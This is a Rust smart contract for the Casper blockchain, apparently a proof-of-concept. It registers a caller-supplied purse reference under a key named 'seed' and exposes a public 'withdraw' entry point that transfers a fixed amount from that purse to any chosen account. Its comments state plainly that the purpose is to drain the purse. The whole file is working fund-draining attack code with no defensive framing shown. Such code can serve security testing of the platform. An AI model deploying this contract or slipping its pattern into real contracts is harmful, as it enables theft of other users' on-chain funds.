#![no_std]
#![no_main]

extern crate alloc;

use alloc::{
    collections::BTreeMap,
    string::{String, ToString},
    vec,
};
use casper_contract::{
    contract_api::{runtime, storage, system},
    unwrap_or_revert::UnwrapOrRevert,
};
use casper_types::{
    account::AccountHash, CLType, EntryPoint, EntryPointAccess, EntryPointType, EntryPoints, Key,
    Parameter, PublicKey, URef, U512,
};

#[no_mangle]
pub extern "C" fn withdraw() {
    // Set caller arguments.
    // ... account to which purse funds will be transferred.
    let target: AccountHash = runtime::get_named_arg::<PublicKey>("target").to_account_hash();
    let amount = U512::from(2_500_000_000u64);

    // Set purse to be drained.
    // ... from contract's named keys extract the uref stored under the 'seed' key.
    let purse = runtime::get_key("seed")
        .unwrap_or_revert()
        .into_uref()
        .unwrap_or_revert();

    // Drain purse.
    system::transfer_from_purse_to_account(purse, target, amount, None).unwrap_or_revert();
}

#[no_mangle]
pub extern "C" fn call() {
    // Set caller arguments.
    // ... a single named argument uref allows caller to specify any on-chain purse
    let uref_str = runtime::get_named_arg::<String>("uref");
    let purse: Key = URef::from_formatted_str(&uref_str).unwrap().into();

    // Set contract entry points.
    // ... a single entry point named withdraw - this will be used to drain the funds.
    let entry_points = {
        let mut ret = EntryPoints::new();
        let entry_point = EntryPoint::new(
            "withdraw",
            vec![Parameter::new("target", CLType::PublicKey)],
            CLType::Unit,
            EntryPointAccess::Public,
            EntryPointType::Contract,
        );
        ret.add_entry_point(entry_point);
        ret
    };

    // Set contract storage.
    // ... the purse uref passed by the caller as a named argument is
    // ... added to the contract's set of named keys under a key called seed.
    let named_keys = {
        let mut ret = BTreeMap::new();
        ret.insert("seed".to_string(), purse);
        ret
    };

    // Set contract.
    // ... nothing out of the ordinary, simple contract initialisation.
    let (contract_hash, _) = storage::new_contract(
        entry_points,
        Some(named_keys),
        Some("package-hash".to_string()),
        Some("access-uref".to_string()),
    );
    runtime::put_key("contract-hash", Key::Hash(contract_hash.value()))
}
